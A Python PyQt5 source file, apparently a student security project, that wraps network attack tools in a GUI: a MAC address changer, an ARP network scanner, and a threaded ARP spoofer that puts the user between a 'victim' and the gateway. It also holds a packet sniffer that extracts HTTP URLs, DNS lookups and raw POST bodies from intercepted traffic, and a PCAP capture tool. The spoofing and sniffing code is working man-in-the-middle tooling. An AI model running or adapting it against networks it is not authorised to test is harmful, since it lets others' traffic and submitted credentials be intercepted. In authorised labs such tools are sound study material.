import sys
import scapy.all as scapy
from scapy.layers import http, dns
import re
from PyQt5.QtWidgets import *
from PyQt5 import QtGui, QtWidgets
from Ui_Project1 import Ui_MainWindow
from callMacChange import MyForm
from mac_change import *
from network_scanner import *
from arp_spoofer import *
from time import sleep
from PyQt5.QtCore import *
from PyQt5.QtGui import QTextCursor

class ARPworker(QThread):
    update_signal = pyqtSignal(str)
    #Creates a signal to send data back to the MainWindow Class
    def __init__(self, victimIP, gatewayIP):
        QThread.__init__(self)
        self.victimIP = victimIP
        self.gatewayIP = gatewayIP
        # Sets up the gatewayip and victimip so they can be used by the thread

    def __del__(self):
        print("Stopping")

    def run(self):
        while self.isRunning:
            try:
                spoofarp(self.gatewayIP, self.victimIP)
                spoofarp(self.victimIP, self.gatewayIP)
                sleep(2)
                self.update_signal.emit("Success!")
                # Will run the spoofARP function in the background
            except Exception:
                self.update_signal.emit("Error! Invalid IP, or no internet connection!")



class Packetworker(QThread):
    packet_signal=pyqtSignal(str)

    def __init__(self, sniffInterface):
        QThread.__init__(self)
        self.sniffInterface = sniffInterface
        self.ui = Ui_MainWindow()

    def __del__(self):
        print("---------Stopping Packet Sniffing----------")

    def run(self):
        # while self._isRunning == True:
        # sniff(self.sniffInterface)
        while self.isRunning:
            try:
                scapy.sniff(iface=self.sniffInterface, store=False, prn=self.sniffed_http_packet,
                        filter="port 80 or port 53 or port 8080")
                # While the QThread is running, the sniff functionality is constantly ran, interface is definded
                # prn is used to send the packets to the definition below
            except scapy.Scapy_Exception:
                self.packet_signal.emit("No Such Interface!")
                # Exception occurs if no interface/wrong interface is entered, is emited to be added to the label
                self.terminate()

    def sniffed_http_packet(self, packet):
        if packet.haslayer(http.HTTPRequest):
            # If a Http Request does occur the following occurs:
            url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
            # Here the Host and path of the webpage are connected to create the web page path
            method = packet[http.HTTPRequest].Method.decode()
            urlsearch = re.search(r"\bocsp" + '|' + r"\badservice" + '|' + r"\bgoogleads", url)
            # using regular expression the program attempts to find any webpages beginning with 'entered strings'.
            # These are commonly used for google ads, and doing this will help filter out nonsense data.
            if urlsearch:
                return
                # If present it returns to continue packet sniffing
            else:
                filtered_packet = "[HTTP Layer " + method + " Request] Url Requested: " + str(url)
                self.packet_signal.emit(filtered_packet)
                # If not present the information is more likely to be useful so it emits
                if packet.haslayer(scapy.Raw) and method == 'POST':
                    # If the post method is present along side it being on the RAW layer, then the following happens
                    postdata = "[Raw Layer] POST data found: " + str(packet[scapy.Raw].load)
                    # Creates a string to display the infomation as readable as possible
                    print(postdata)
                    self.packet_signal.emit(postdata)
                    # Emits the created string to be added to the TextBrowser
        if packet.haslayer(dns.DNSQR):
            # packet has the DNS layer
            dns_name = packet[dns.DNSQR].qname.decode()
            dnssearch = re.search(r"\badservice" + '|' + r"\bgoogleads"  '|' + r"\bsafebrowsing" + '|' + r"\bocsp",
                                  dns_name)
            #Again the DNS regular expression search is to filter out nonsense infomation such as ads
            if dnssearch:
                return
            else:
                filtered_packet = ("[DNS Layer] Url Visited/Requested: " + dns_name)
                self.packet_signal.emit(filtered_packet)
                #Emits the useful infomation to be added to the textbox


class PCAPworker(QThread):
    PCAP_signal=pyqtSignal(str)
    # Defines signal to be used to emit infomation

    def __init__(self, pcapInterface, filename, packet_count):
        QThread.__init__(self)
        self.pcapInterface = pcapInterface
        self.filename = filename
        self.packet_count=packet_count
        # QThread is initialised and passed the interface, number of packets, and filename information the user entered
        self.ui = Ui_MainWindow()

    def __del__(self):
        print("Stopping")

    def run(self):
        try:
            self.PCAP_signal.emit("Starting to sniff traffic")
            packets = scapy.sniff(iface=self.pcapInterface, count= int(self.packet_count))
            #All the sniffed packets are stored in 'packets', count sets the ammount to be stored
            scapy.wrpcap(self.filename + '.pcap', packets)
            # wrpcap allows for .pcap files to be written, uses the file name the user entered and appends it with the
            # packets stored. Can be opened in a third party application like wireshark.
            self.PCAP_signal.emit("Sniffing complete! PCAP file " + self.filename + ".pcap created")
            # Once it has been written successfully, the program emits the message to let the user know it was made
            self.quit()
            #The QThread is quit
        except Exception:
            self.PCAP_signal.emit("Invalid user input, check the inputs entered")




class MainWindow:

    def __init__(self):
        self.main_win = QMainWindow()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self.main_win)

        # Sets the first page the user sees
        self.ui.stackedWidget.setCurrentWidget(self.ui.macSpoofPage)

        # Sets what the buttons on the program do
        self.ui.macButton.clicked.connect(self.showMAC)
        # When clicking on the Mac Spoofer Button it will show the page on the program
        self.ui.spoofClickMe.clicked.connect(self.mac_message)
        # When the user clicks the 'Spoof' button it will execute what is in def mac_message
        
        self.ui.arpButton.clicked.connect(self.showARP)
        self.ui.arpSpoofButton.clicked.connect(self.ARP_Message)
        # When the user clicks the ARP spoof button it will execute the ARP_Message

        self.ui.networkButton.clicked.connect(self.showNetwork)
        #When network scanner is selected the correct page displays
        self.ui.scanButton.clicked.connect(self.network_message)
        #When the Scan button is pressed on this page, the program will execute the scan functionaility

        self.ui.packetButton.clicked.connect(self.showPacket)
        #When the packet sniffer button is pressed, the correct page is displayed
        self.ui.startPacketSniff.clicked.connect(self.packet_sniff)
        #When the start button is pressed on the page, the sniffing functionaility will execute.

        self.ui.pcapButton.clicked.connect(self.showPCAP)
        self.ui.sniffPCAPFile.clicked.connect(self.sniffPCAP)

    def show(self):
        self.main_win.show()

    def showMAC(self):
        self.ui.stackedWidget.setCurrentWidget(self.ui.macSpoofPage)

    def showARP(self):
        self.ui.stackedWidget.setCurrentWidget(self.ui.arpSpooferPage)

    def showNetwork(self):
        self.ui.stackedWidget.setCurrentWidget(self.ui.networkScannerPage)

    def showPacket(self):
        self.ui.stackedWidget.setCurrentWidget(self.ui.packetSnifferPage)

    def showList(self):
        self.ui.listWidgetDevices.setCurrentWidget(self.ui.listWidgetDevices)

    def showPCAP(self):
        self.ui.stackedWidget.setCurrentWidget(self.ui.pcapPage)

    def mac_message(self):

        # Sets the 2 text boxes that are edited by the user to objects
        interface = self.ui.interfaceEdit.text()
        new_mac = self.ui.addressEdit.text()

        # Here I get the current mac of the interface entered and display it
        current_mac = get_mac(interface)

        self.ui.mac_current.setText("The current mac of this interface was: " + current_mac)

        # Here it changes the mac address and checks the that it has been changed by repeating get_mac
        change_address(interface, new_mac)
        current_mac = get_mac(interface)
        # Depending on whether the MAC address has changed a message will display informing the user
        if current_mac == new_mac:
            self.ui.mac_update.setText("Mac address Changed too: " + new_mac)
        else:
            self.ui.mac_update.setText("Error was unable to change Mac too: " + new_mac)

    def network_message(self):

        scanIP = self.ui.scanIPEdit.text()
        # Stores the input entered by the user in the text box as scanIP
        answered_list = scan(scanIP)[0]
        print(answered_list)
        # Here i send the input entered by the user to the scan def, in network_scanner.py, the return is a list
        # called answered_list
        self.ui.listWidgetDevices.clear()
        # Clears the current contents of the list
        self.ui.listWidgetDevices.addItem("IP Address\t\tMac Address")
        # Adds text which is used to identify the contents of each column
        for net in answered_list:
            print(net[1].psrc + "\t\t" + net[1].hwsrc)
            item = QListWidgetItem(net[1].psrc + "\t\t" + net[1].hwsrc)
            self.ui.listWidgetDevices.addItem(item)
            # Here the program prints every entry in the list created into the GUI list widget, using a loop
        self.ui.listWidgetDevices.addItem("------------------------------------------------------")

    def ARP_Message(self):

        victimIP = self.ui.targetIP.text()
        gatewayIP = self.ui.gatewayIP.text()
        # assigns victim and gateway ip too the contents entered in the text box by the user

        self.ARPsend = ARPworker(victimIP, gatewayIP)

        self.ARPsend.start()
        # starts a QThread for the arp spoofer to run in the background, allowing the user to interact with
        # the program still
        self.ARPsend.update_signal.connect(self.update_ARP_progress)
        # Connects to the signal from ARPWorker, once it emits, it is sent to the update method

        self.ui.pushButton.clicked.connect(lambda: self.restoreARP(victimIP, gatewayIP))
        self.ui.pushButton.clicked.connect(self.ARPsend.terminate)
        # Once the restore button is pressed it will terminate the arp spackets being sent
        # and send a packet too restore the the original connection so we are no longer the man
        # in the middle

    def restoreARP(self, victimIP, gatewayIP):
        try:
            restore(victimIP, gatewayIP)
            restore(gatewayIP, victimIP)
            # sends the ip adresses to the restore function for both the gateway and target.
            progress = "Successfully Restored!"
            self.update_ARP_progress(progress)
            # Once completed the label is updated stating they were successful
        except Exception:
            print("Error!")
            progress = "Error! Invalid IPs or no need to restore"
            self.update_ARP_progress(progress)
            # If an exception/error occurs, the user is informed.

    def update_ARP_progress(self, progress):
        self.ui.arpSpoofUpdate.setText(progress)
        # Sets the text of the label present on the ARP spoofer screen.


    def packet_sniff(self):

        sniffInterface = self.ui.interfaceSniff.text()
        # sys.stdout = Port(self.ui.result_Browser)

        self.Sniffer = Packetworker(sniffInterface)
        self.Sniffer.start()
        # starts the QThread for the Packet Sniffer
        self.Sniffer.packet_signal.connect(self.packet_add)
        #connects to the packet_signal in the QThread, if it is emited, the infomation is sent too packet_add
        self.ui.stopPacketSniff.clicked.connect(self.stop_packet_sniffer)


    def stop_packet_sniffer(self):
        self.Sniffer.terminate()

    def packet_add(self, filtered_packet):
        self.ui.result_Browser.append(filtered_packet)
        #appends the textbrowser with the new packet infomation


    def sniffPCAP(self):
        pcapInterface = self.ui.pcapInterfaceSniff.text()
        filename = self.ui.pcapFilename.text()
        packet_count = self.ui.packet_count.text()
        # the user input is given values

        self.pcapWorker = PCAPworker(pcapInterface, filename, packet_count)
        self.pcapWorker.start()
        #the pcapWorker QThread is created, the user values are sent too it too

        self.pcapWorker.PCAP_signal.connect(self.updatePCAP)
        #sends the emited string to update the label
        self.ui.stopPCAPSniff.clicked.connect(self.stopPCAP)

    def updatePCAP(self, PCAP_progress):
        self.ui.pcapUpdateLabel.setText(PCAP_progress)
        #updates the label for the PCAP page, informing the user of the current progress

    def stopPCAP(self):
        self.ui.pcapUpdateLabel.setText('Successfully stopped, .pcap file was not created')
        self.pcapWorker.terminate()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    main_win = MainWindow()
    main_win.show()
    sys.exit(app.exec())
